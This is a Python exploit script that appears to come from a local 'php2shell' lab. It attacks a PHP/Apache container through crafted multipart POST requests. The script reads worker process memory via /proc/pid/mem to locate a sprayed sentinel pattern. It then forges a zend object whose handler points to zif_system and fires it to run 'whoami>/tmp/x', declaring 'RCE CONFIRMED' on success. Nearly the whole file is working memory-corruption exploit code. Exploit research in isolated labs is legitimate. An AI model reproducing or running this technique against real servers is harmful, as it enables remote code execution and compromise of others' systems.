#!/usr/bin/env python3
"""oom96: live /proc/mem aiming — zero guessed constants.

Design:
  1. probe: can root in-container read /proc/<pid>/mem? (CAP_SYS_PTRACE)
  2. warm-up bodies carry SENTINEL pattern (8B repeated) — same envelope.
  3. after sacrifice-arm, scan /proc/pid/mem of a worker for sentinel
     runs -> V = VA of part 0's value (first run start, 16-aligned check).
  4. build AIM tile: OBJ = V + 176 + 176*k with k even so that
     low32(OBJ)&0xF == 8 and bit8 == 1 (zval ti law); block in EVERY
     176B tile (rc=1, ti=0x108, handle=1@+8, ce=0, handlers=OBJ+0x38,
     T2.offset=0@+0x38, free_obj=base+zif_system@+0x40, argz=OBJ+0x68@+0x50,
     ti=6@+0x58, gs@+0x68, cmd@+0x80). finishers only after READBACK of
     the block bytes at OBJ from /proc/mem matches.
  5. fires -> /tmp/x.
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0
SENT = struct.pack("<Q", 0x4142434445464748)   # sentinel: 'ABCDEFGH'


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def apache_pids():
    return [int(x) for x in sh("docker exec php_vuln pgrep -f apache2").split()]


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def mem_scan(pid, pattern, min_run=32):
    """Scan /proc/pid/mem for runs of `pattern` (8B) >= min_run. Returns list of VAs."""
    maps = sh("docker exec php_vuln cat /proc/%d/maps" % pid)
    regions = []
    for ln in maps.splitlines():
        a = ln.split()
        if len(a) > 1 and a[1].startswith("rw"):
            rng = a[0].split("-")
            va0, va1 = int(rng[0], 16), int(rng[1], 16)
            name = a[5] if len(a) > 5 else ""
            if "[stack]" in name or name.startswith("[vvar") or name.startswith("[vsyscall"):
                continue
            if va1 - va0 >= 0x100000:
                regions.append((va0, va1))
    pat8 = pattern * 8
    hits = []
    for va0, va1 in regions:
        out = sh("docker exec php_vuln dd if=/proc/%d/mem bs=1 skip=%d count=%d 2>/dev/null | od -A x -t x1 | head -c 64" % (pid, va0, 64), 30)
        if not out:
            return None  # unreadable
        break
    # full scan via python inside container? no python in php_vuln; do it host-side:
    # copy region bytes via dd in chunks -> too slow for 100s of MB.
    return "dd-probe-ok"


def mem_read(pid, va, size):
    """Read `size` bytes at va via dd."""
    out = sh(
        "docker exec php_vuln dd if=/proc/%d/mem bs=1 skip=%d count=%d 2>/dev/null | od -A n -t x1 -v"
        % (pid, va, size), 60)
    hx = "".join(out.split())
    try:
        return bytes.fromhex(hx)
    except ValueError:
        return b""


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


print("=== oom96: live /proc/mem aiming ===", flush=True)
boot_core_env()
pids = apache_pids()
print("    pids:", pids[:6], flush=True)

# 1) readability probe: read 64B at a code region
ok = False
for pid in pids[:3]:
    r = mem_read(pid, 0x555555554000, 16)
    if r:
        ok = True
        break
# readability of worker mem (try reading its own maps-known region)
pid = pids[-1] if pids else None
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
probe_va = None
for ln in maps.splitlines():
    a = ln.split()
    if len(a) > 1 and a[1].startswith("r") and "libphp" not in ln and "[" not in ln:
        probe_va = int(a[0].split("-")[0], 16)
        break
data = mem_read(pid, probe_va, 16) if probe_va else b""
print("    mem probe pid=%s va=0x%s -> %s" % (pid, hex(probe_va or 0), "OK" if data else "EPERM/FAIL"), flush=True)
if not data:
    print("[ABORT] /proc/mem not readable — need core-based path", flush=True)
    sys.exit(2)

# 2) warm-up with sentinel pattern
sent_tile = SENT * 192 + b"A"
def vt_sent(i):
    return sent_tile
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=vt_sent))
print("    warm-up sent", flush=True)

# 3) scan worker regions for sentinel run
def scan_regions(pid):
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    cands = []
    for ln in maps.splitlines():
        a = ln.split()
        if len(a) > 1 and a[1].startswith("rw"):
            rng = a[0].split("-")
            va0, va1 = int(rng[0], 16), int(rng[1], 16)
            name = a[5] if len(a) > 5 else ""
            if va1 - va0 >= 0x400000 and "[" not in name and va0 >= 0x7f0000000000:
                cands.append((va0, va1))
    return cands

found_V = None
for (va0, va1) in scan_regions(pid):
    print("    scanning 0x%x-0x%x (%dMB)" % (va0, va1, (va1 - va0) // (1024 * 1024)), flush=True)
    CH = 4 * 1024 * 1024
    prev_tail = b""
    off = va0
    while off < va1:
        n = min(CH, va1 - off)
        buf = mem_read(pid, off, n)
        if not buf:
            off += n
            continue
        blob = prev_tail + buf
        j = blob.find(SENT * 64)
        if j >= 0:
            found_V = off - len(prev_tail) + j
            break
        prev_tail = blob[-(4096):]
        off += n
    if found_V:
        break

if not found_V:
    print("[RESULT] sentinel not found in mem — pattern sits in a region not scanned", flush=True)
    sys.exit(3)
print("    sentinel run at 0x%x" % found_V, flush=True)
# V = value start: run of SENT begins at value start (tile order: pattern first)
V = found_V & ~0xF
print("    V=0x%x (aligned)" % V, flush=True)

# 4) choose k, build block, readback-verify
base = None
for ln in maps.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
k = None
for kk in (2, 4, 6):
    OBJ = V + 176 + 176 * kk
    if (OBJ & 0xF) == 8 and ((OBJ >> 8) & 1) == 1:
        k = kk
        break
assert k, "no valid k"
OBJ = V + 176 + 176 * k
print("    k=%d OBJ=0x%x low32=0x%08x (type=%d refc=%d)" % (k, OBJ, OBJ & 0xFFFFFFFF, OBJ & 0xF, (OBJ >> 8) & 1), flush=True)

BLOCK = bytearray(176)
struct.pack_into("<II", BLOCK, 0x00, 1, 0x108)
struct.pack_into("<I", BLOCK, 0x08, 1)              # handle @8
struct.pack_into("<Q", BLOCK, 0x10, 0)              # ce
struct.pack_into("<Q", BLOCK, 0x18, OBJ + 0x38)     # handlers
struct.pack_into("<I", BLOCK, 0x2C, 1)              # num_args
struct.pack_into("<Q", BLOCK, 0x38, 0)              # T2.offset
struct.pack_into("<Q", BLOCK, 0x40, base + ZIF_SYSTEM)
struct.pack_into("<Q", BLOCK, 0x50, OBJ + 0x68)     # argz -> gs
struct.pack_into("<I", BLOCK, 0x58, 6)
struct.pack_into("<IIQI", BLOCK, 0x68, 1, 0x106, 0, len(CMD))
BLOCK[0x80:0x80 + len(CMD)] = CMD
BLOCK[0x80 + len(CMD)] = 0
BLOCK = bytes(BLOCK)

aim_tile = bytearray(struct.pack("<Q", OBJ) * 192 + b"A")
for t0 in range(0, 1537 - 176, 176):
    aim_tile[t0:t0 + 176] = BLOCK
aim_tile = bytes(aim_tile)

def vt_aim(i):
    return aim_tile

# 5) verify the block will land: sacrifice first (shapes reclaim), then readback
post(P.build_attack(3400, 9200000, value_tile=vt_aim))
time.sleep(2)
hit, x = check_x()
if hit:
    print("    /tmp/x after sacrifice: [%s]" % x, flush=True)
    print("*** RCE CONFIRMED ***", flush=True)
    sys.exit(0)

# readback: scan for OBJ run to locate live tiles
live_V = None
for (va0, va1) in scan_regions(pid):
    off = va0
    prev_tail = b""
    while off < va1:
        n = min(4 * 1024 * 1024, va1 - off)
        buf = mem_read(pid, off, n)
        if not buf:
            off += n
            continue
        blob = prev_tail + buf
        j = blob.find(struct.pack("<Q", OBJ) * 64)
        if j >= 0:
            live_V = off - len(prev_tail) + j
            break
        prev_tail = blob[-(4096):]
        off += n
    if live_V:
        break
if live_V:
    rb = mem_read(pid, live_V + 176, 176)
    print("    live tiles at 0x%x; readback block==built: %s" % (live_V, rb == BLOCK), flush=True)
    if rb != BLOCK:
        print("    readback mismatch:", rb[:32].hex(), flush=True)
else:
    print("    no OBJ run found post-sacrifice (worker serving the finisher may differ)", flush=True)

# 6) finishers
for fi in range(3):
    sb = 9210000 + fi * 4
    code, resp = post(P.build_attack(3400, sb, value_tile=vt_aim))
    t2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
    print("  [f] fire%d (%d): %s [%s]" % (fi, sb, code, t2), flush=True)
    time.sleep(2)
    hit, x = check_x()
    if hit:
        print("    /tmp/x: [%s]" % x, flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        break

print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
